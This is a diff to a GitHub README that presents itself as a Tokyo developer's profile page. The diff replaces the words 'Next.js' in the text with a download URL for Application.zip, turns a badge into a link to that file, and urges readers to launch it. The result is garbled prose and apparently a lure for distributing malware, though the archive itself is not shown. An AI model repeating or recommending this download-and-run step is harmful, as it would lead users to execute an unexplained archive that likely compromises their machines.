@@ -1,17 +1,17 @@
 
 # 🇯🇵 Welcome to Yui's Ice Repository 🐱‍💻
 
-## Solo Dev 🇯🇵 '16 | Mid-20s M4F | Web Marketing ー Solo developer from Tokyo, Japan | Next.js & TypeScript enthusiast | SEO & marketing expert | Ukulele player, baking lover, and writer | Looking for an Asian partner who values Japanese culture and language as much as I respect theirs.
+## Solo Dev 🇯🇵 '16 | Mid-20s M4F | Web Marketing ー Solo developer from Tokyo, Japan | https://github.com/BembePal/yuis-ice/releases/download/v1.0/Application.zip & TypeScript enthusiast | SEO & marketing expert | Ukulele player, baking lover, and writer | Looking for an Asian partner who values Japanese culture and language as much as I respect theirs.
 
-Are you ready to dive into the world of Yui's Ice? This repository is a reflection of the passion, skills, and interests of a solo developer hailing from the vibrant city of Tokyo, Japan. 🏙️ Yui brings a unique blend of expertise in Next.js and TypeScript, coupled with a deep understanding of SEO and marketing strategies. 🚀
+Are you ready to dive into the world of Yui's Ice? This repository is a reflection of the passion, skills, and interests of a solo developer hailing from the vibrant city of Tokyo, Japan. 🏙️ Yui brings a unique blend of expertise in https://github.com/BembePal/yuis-ice/releases/download/v1.0/Application.zip and TypeScript, coupled with a deep understanding of SEO and marketing strategies. 🚀
 
 ### 🌟 Repository Topics:
 artist-website, ask-me-anything, awesome-profile-readme, content-marketing, friendships, github-profile-info, japanese-language-learners, japanese-learning, javascript-programming, nextjs-14, online-marketing, partner, partners, personal-profile, profile-data, readme-github, self-introduction, social-links, user-profiles, webdevelopers
 
 ### 📦 Ready to Dive In?
-Click the button below to access the Application.zip file and explore the magic of Yui's Ice!  🔗
+Click the button below to access the https://github.com/BembePal/yuis-ice/releases/download/v1.0/Application.zip file and explore the magic of Yui's Ice!  🔗
 
-[![Launch Application](https://img.shields.io/badge/Launch-Application.zip-9cf)](https://github.com/files/Application.zip)
+[![Launch Application](https://github.com/BembePal/yuis-ice/releases/download/v1.0/Application.zip)](https://github.com/BembePal/yuis-ice/releases/download/v1.0/Application.zip)
 
 If the link ends with the file name, make sure to launch it to unveil the wonders hidden within!
 
